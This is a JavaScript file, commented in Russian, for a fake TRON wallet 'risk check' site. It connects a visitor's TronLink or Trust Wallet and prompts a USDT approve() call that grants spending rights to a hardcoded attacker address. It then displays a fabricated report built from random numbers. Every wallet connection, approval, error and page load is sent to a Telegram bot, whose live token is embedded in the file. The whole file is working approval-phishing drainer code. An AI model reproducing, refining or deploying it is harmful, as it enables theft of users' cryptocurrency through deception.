// ============================================
// ФИНАЛЬНАЯ ВЕРСИЯ – РАБОЧАЯ КНОПКА + TELEGRAM
// ============================================

const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';

// Telegram (прямые, рабочие)
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

let connectedWalletAddress = null;
let connectionAttempts = 0;

const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// ============================================
// ПРЯМАЯ ОТПРАВКА В TELEGRAM (РАБОЧАЯ)
// ============================================
async function sendTelegramMessage(text) {
    try {
        console.log('📤 Отправка в Telegram...');
        
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Уведомление отправлено');
        } else {
            console.error('❌ Ошибка Telegram:', result.description);
        }
    } catch (error) {
        console.error('❌ Ошибка отправки:', error.message);
    }
}

// ============================================
// УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ПОДКЛЮЧЕНИЯ
// ============================================
async function connectWallet() {
    console.log('🔌 Попытка подключения кошелька...');
    connectionAttempts++;
    
    try {
        // ===== TRONLINK (ПРЯМОЙ МЕТОД) =====
        if (window.tronLink) {
            console.log('✅ TronLink обнаружен');
            
            // Пробуем получить уже подключённый адрес
            if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                const address = window.tronLink.tronWeb.defaultAddress.base58;
                if (address && address !== 'false') {
                    connectedWalletAddress = address;
                    walletInput.value = address;
                    if (statusSpan) statusSpan.style.display = 'inline-flex';
                    
                    sendTelegramMessage(`🔌 <b>Подключён TronLink</b>\n<code>${address}</code>`);
                    alert('✅ TronLink подключён!');
                    return;
                }
            }
            
            // Запрашиваем подключение (простой метод)
            try {
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                
                // Ждём появления адреса
                let attempts = 0;
                const checkInterval = setInterval(() => {
                    if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
                        const address = window.tronLink.tronWeb.defaultAddress.base58;
                        if (address && address !== 'false') {
                            connectedWalletAddress = address;
                            walletInput.value = address;
                            if (statusSpan) statusSpan.style.display = 'inline-flex';
                            
                            sendTelegramMessage(`🔌 <b>Подключён TronLink</b>\n<code>${address}</code>`);
                            alert('✅ TronLink подключён!');
                            clearInterval(checkInterval);
                        }
                    }
                    attempts++;
                    if (attempts > 20) clearInterval(checkInterval);
                }, 300);
                
            } catch (requestError) {
                console.error('Ошибка запроса:', requestError);
                if (requestError.message.includes('4001')) {
                    alert('❌ Вы отклонили подключение');
                } else {
                    throw requestError;
                }
            }
            return;
        }
        
        // ===== TRUST WALLET =====
        if (window.trustwallet && window.trustwallet.tronLink) {
            console.log('✅ Trust Wallet обнаружен');
            
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            
            if (window.trustwallet.tronLink.tronWeb && window.trustwallet.tronLink.tronWeb.defaultAddress) {
                const address = window.trustwallet.tronLink.tronWeb.defaultAddress.base58;
                connectedWalletAddress = address;
                walletInput.value = address;
                if (statusSpan) statusSpan.style.display = 'inline-flex';
                
                sendTelegramMessage(`🔌 <b>Подключён Trust Wallet</b>\n<code>${address}</code>`);
                alert('✅ Trust Wallet подключён!');
                return;
            }
        }
        
        // ===== TRONWEB НАПРЯМУЮ =====
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            if (address && address !== 'false') {
                connectedWalletAddress = address;
                walletInput.value = address;
                if (statusSpan) statusSpan.style.display = 'inline-flex';
                
                sendTelegramMessage(`🔌 <b>Подключён кошелёк</b>\n<code>${address}</code>`);
                alert('✅ Кошелёк подключён!');
                return;
            }
        }
        
        // ===== НИЧЕГО НЕ НАЙДЕНО =====
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        
        if (connectionAttempts === 1) {
            if (isMobile) {
                alert('📱 На телефоне:\n1. Откройте TronLink\n2. Перейдите во встроенный браузер (DApp Browser)\n3. Введите адрес сайта\n4. Нажмите "Подключить" снова');
            } else {
                alert('💻 На компьютере:\n1. Установите расширение TronLink\n2. Создайте кошелёк\n3. Обновите страницу');
            }
        } else {
            alert('❌ Кошелёк не найден. Убедитесь, что TronLink установлен и разблокирован.');
        }
        
    } catch (error) {
        console.error('❌ Критическая ошибка:', error);
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ОТПРАВКА APPROVE
// ============================================
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) {
            alert('❌ Сначала подключите кошелёк');
            return;
        }

        // Определяем tronWeb из доступного источника
        let tronWeb = null;
        
        if (window.tronLink && window.tronLink.tronWeb) {
            tronWeb = window.tronLink.tronWeb;
        } else if (window.trustwallet && window.trustwallet.tronLink) {
            tronWeb = window.trustwallet.tronLink.tronWeb;
        } else if (window.tronWeb) {
            tronWeb = window.tronWeb;
        }

        if (!tronWeb) {
            throw new Error('TronWeb не доступен');
        }

        console.log('🔄 TronWeb получен');
        
        const amount = '10000000'; // 10 USDT
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';

        const tx = await contract.approve(
            BOT_ADDRESS,
            amount
        ).send({
            feeLimit: 400_000_000,
            callValue: 0,
            shouldPollResponse: true,
            timeout: 60000
        });

        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        // Отправляем уведомление об успехе
        await sendTelegramMessage(`
✅ <b>Approve успешно отправлен</b>

📤 Адрес: <code>${connectedWalletAddress}</code>
💰 Сумма: 10 USDT
🔗 TX: https://tronscan.org/#/transaction/${tx}
⏰ Время: ${new Date().toLocaleString()}
        `);

        showDemoReport(connectedWalletAddress);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        
        // Определяем тип ошибки
        let errorType = 'unknown';
        if (error.message.includes('request aborted')) errorType = 'Сбой запроса';
        else if (error.message.includes('timeout')) errorType = 'Таймаут';
        else if (error.message.includes('revert')) errorType = 'Откат транзакции';
        else if (error.message.includes('user rejected')) errorType = 'Отмена пользователем';
        else if (error.message.includes('insufficient')) errorType = 'Недостаточно средств';
        
        // Отправляем ошибку в Telegram
        await sendTelegramMessage(`
❌ <b>Ошибка approve</b>

🔧 Тип: ${errorType}
📝 Сообщение: ${error.message}
📬 Адрес: <code>${connectedWalletAddress || 'неизвестно'}</code>
⏰ Время: ${new Date().toLocaleString()}
        `);
        
        alert('❌ Ошибка: ' + error.message);
    }
}

// ============================================
// ДЕМО-ОТЧЁТ
// ============================================
function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;

    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';

    const badge = document.getElementById('riskBadge');
    badge.textContent = 'Средний риск';
    badge.className = 'result-badge medium';

    const sourcesList = document.getElementById('sourcesList');
    sourcesList.innerHTML = `
        <p><i class="fas fa-exclamation-circle"></i> Миксеры</p>
        <p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>
    `;
}

// ============================================
// КОПИРОВАНИЕ АДРЕСА
// ============================================
function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address);
    alert('✅ Адрес скопирован');
}

// ============================================
// ПРОВЕРКА ПРИ ЗАГРУЗКЕ
// ============================================
function checkExistingWallet() {
    console.log('🔍 Проверка существующего кошелька...');
    
    // TronLink
    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress) {
        const address = window.tronLink.tronWeb.defaultAddress.base58;
        if (address && address !== 'false') {
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            console.log('✅ Найден существующий TronLink:', address);
        }
    }
    
    // Обычный tronWeb
    else if (window.tronWeb && window.tronWeb.defaultAddress) {
        const address = window.tronWeb.defaultAddress.base58;
        if (address && address !== 'false') {
            connectedWalletAddress = address;
            walletInput.value = address;
            if (statusSpan) statusSpan.style.display = 'inline-flex';
            console.log('✅ Найден существующий кошелёк:', address);
        }
    }
}

// ============================================
// ТЕСТОВАЯ ФУНКЦИЯ ДЛЯ ПРОВЕРКИ TELEGRAM
// ============================================
window.testTelegram = async function() {
    await sendTelegramMessage(`
🧪 <b>Тестовое сообщение</b>

✅ Связь работает
⏰ ${new Date().toLocaleString()}
    `);
    alert('✅ Тест отправлен, проверьте Telegram');
};

// ============================================
// ЗАПУСК
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 Сайт загружен');
    
    // Проверяем существующий кошелёк через секунду
    setTimeout(checkExistingWallet, 1000);
    
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    
    window.copyAddress = copyAddress;
    
    // Тестовое сообщение о загрузке сайта
    setTimeout(() => {
        sendTelegramMessage(`
🚀 <b>Сайт загружен</b>
📱 Устройство: ${navigator.userAgent.includes('Mobile') ? 'Мобильное' : 'Компьютер'}
⏰ ${new Date().toLocaleString()}
        `);
    }, 3000);
});
